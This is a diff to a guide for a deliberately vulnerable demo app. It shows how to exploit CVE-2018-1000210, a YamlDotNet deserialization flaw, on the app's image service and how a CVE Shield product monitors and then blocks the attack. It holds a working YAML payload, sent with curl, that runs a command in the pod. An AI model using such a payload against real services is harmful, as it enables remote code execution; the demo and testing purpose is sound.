@@ -571,24 +571,22 @@ The image service (.NET 8) uses YamlDotNet 4.3.2 to parse photo tags sent to `PO
 
 The image service also pins Newtonsoft.Json 12.0.3 (CVE-2024-21907) and parses photo metadata with it at `POST /photometa`, so normal use exercises a second vulnerable library.
 
-**Exploitation:**
+**Exploitation via the Simulation Console:**
 
-The image service has no ingress, so port-forward it first:
+1. In the simulation console, under the individual exploits, click **CVE-2018-1000210 RCE**
+2. The console logs in, imports an ordinary tags file (normal usage), then sends a tags file that runs `id` through `ThumbnailHook` and writes the output to a new file in the uploads folder
+3. It reads that file back through the photo viewer (`/api/photos/view`). The exploit log shows `SUCCESS: YAML deserialization exploit executed a command (output of id: uid=0(root) ...)`
+
+**Exploitation via curl:**
+
+Frontgate proxies tags imports at `POST /api/photos/tags` for a logged-in session. To call the image service directly, port-forward it:
 
 ```
 kubectl port-forward svc/imageservice 8081:80
+printf '%s\n' '!<!ThumbnailHook,imageservice>' 'Command: touch /tmp/pwned' \
+  | curl -X POST localhost:8081/importtags --data-binary @-
+kubectl exec deploy/cargocats-imageservice -- ls /tmp/pwned
 ```
-
-1. Normal usage, which runs the vulnerable YamlDotNet method with no attack:
-   ```
-   curl -X POST localhost:8081/importtags --data-binary $'cat: whiskers\ncolor: orange\n'
-   ```
-2. Attack, which creates `/tmp/pwned` in the pod:
-   ```
-   printf '%s\n' '!<!ThumbnailHook,imageservice>' 'Command: touch /tmp/pwned' \
-     | curl -X POST localhost:8081/importtags --data-binary @-
-   kubectl exec deploy/cargocats-imageservice -- ls /tmp/pwned
-   ```
 
 **Impact:**
 - Remote code execution on the image service
@@ -597,14 +595,11 @@ kubectl port-forward svc/imageservice 8081:80
 
 **Contrast CVE Shield demo (monitor, then block):**
 
-The CVE-2018-1000210 shield supports BLOCK. It watches `YamlDotNet.Serialization.Deserializer.Deserialize(IParser, Type)` and denies starting a process inside it, so BLOCK stops the payload while ordinary tags imports keep working. `./dotnet-shield-demo.sh` (repo root) runs every step and handles the port-forward.
+The CVE-2018-1000210 shield supports BLOCK. It watches `YamlDotNet.Serialization.Deserializer.Deserialize(IParser, Type)` and denies starting a process inside it, so BLOCK stops the payload while ordinary tags imports keep working. The image service loads YamlDotNet at startup, so the agent holds the shield before the first import.
 
-Before the demo, in `contrast-agent-operator-config.yaml`, set the agent log level to DEBUG (it shows the shield mode and the shield events) and shorten the shield refresh, which is 5 minutes by default, so a MONITOR or BLOCK change reaches the agent in seconds. Apply it, and if Cargo Cats was deployed before this change, rebuild the image:
+The agent picks up a MONITOR or BLOCK change on its next shield refresh, every 5 minutes by default. Before the demo, shorten it in `contrast-agent-operator-config.yaml` and apply it:
 
 ```yaml
-agent:
-  logger:
-    level: DEBUG
 shield:
   enable: true
   refresh_interval_ms: 5000
@@ -612,22 +607,26 @@ shield:
 
 ```
 kubectl apply -f contrast-agent-operator-config.yaml
-make build-imageservice
 ```
 
-The log level applies to every instrumented service, and DEBUG logs can fill a pod's 1Gi ephemeral storage over a few hours, so set it back to INFO after the demo.
+1. In Contrast, Policies > CVE Shields, set the default global CVE Shield protection level to MONITOR
+2. In the simulation console, click **CVE-2018-1000210 RCE**. The log shows `SUCCESS` with the output of `id`, and Contrast reports CVE-2018-1000210 as exploited on the image service
+3. Set the level to BLOCK and wait about 10 seconds
+4. Click **CVE-2018-1000210 RCE** again. The payload returns 500 and the log shows `BLOCKED: the payload failed with 500 and the command did not run`. Contrast reports the blocked attempt
 
-| Step | Command | Expected |
-|---|---|---|
-| 1. Fresh pod | `./dotnet-shield-demo.sh restart` | rollout succeeds |
-| 2. Set MONITOR in Contrast (Policies > CVE Shields, the org-wide default level) | | |
-| 3. Warm up (normal usage) | `./dotnet-shield-demo.sh warm` | HTTP 200, then `"Mode":"MONITOR"`, `"MaxSupportedBehavior":"BLOCK"`, `"Denied":["process"]` |
-| 4. Attack in MONITOR | `./dotnet-shield-demo.sh exploit` | HTTP 200, `EXPLOITED: /tmp/pwned was created` |
-| 5. Set BLOCK in Contrast, wait 10s, then attack again | `./dotnet-shield-demo.sh exploit` | HTTP 500, `BLOCKED: /tmp/pwned was not created` |
-| 6. Agent evidence | `./dotnet-shield-demo.sh logs` | the shield the agent holds, the `Entry` event, the `Capability` event (`process`) and `ShieldAttackBlockedException` |
+Use the org-wide default level for MONITOR and BLOCK. An override scoped to a single application may not be applied for every org.
 
-Notes:
-- Always run `warm` after `restart`. .NET loads YamlDotNet on first use, so the agent only discovers the library on the first `/importtags` call and fetches its shield shortly after. That first call is never shielded.
-- `exploit` removes `/tmp/pwned` before each attempt, and `clean` removes it after an EXPLOITED run.
-- Use the org-wide default level for MONITOR and BLOCK. An override scoped to a single application may not be applied for every org.
-- The .NET agent logs to `/contrast/data/logs/` in the pod. `*_Sensors_*.log` has the shield events, and the block appears in the app log (`kubectl logs deploy/cargocats-imageservice`).
+**Optional: agent log evidence** (needs kubectl, and `level: DEBUG` under `agent: logger:` in `contrast-agent-operator-config.yaml` for the first two commands):
+
+```
+# Mode the agent holds for the shield. The agent logs "new" for the first definition and "updated" after a policy change.
+kubectl exec deploy/cargocats-imageservice -- sh -c "grep -h -E 'Received an? (new|updated) CVE Shield definition' /contrast/data/logs/*Sensors*.log | grep CVE-2018-1000210 | tail -n1 | grep -o -E '\"Mode\":\"[A-Z]+\"'"
+
+# Vulnerable method reached, and the process start caught inside it
+kubectl exec deploy/cargocats-imageservice -- sh -c "grep -h -E \"'(Entry|Capability)' Event.*CVE-2018-1000210\" /contrast/data/logs/*Sensors*.log | tail -n4"
+
+# Blocks
+kubectl logs deploy/cargocats-imageservice | grep 'ShieldAttackBlockedException.*CVE-2018-1000210'
+```
+
+DEBUG applies to every instrumented service and can fill a pod's 1Gi ephemeral storage over a few hours, so set it back to INFO after the demo.
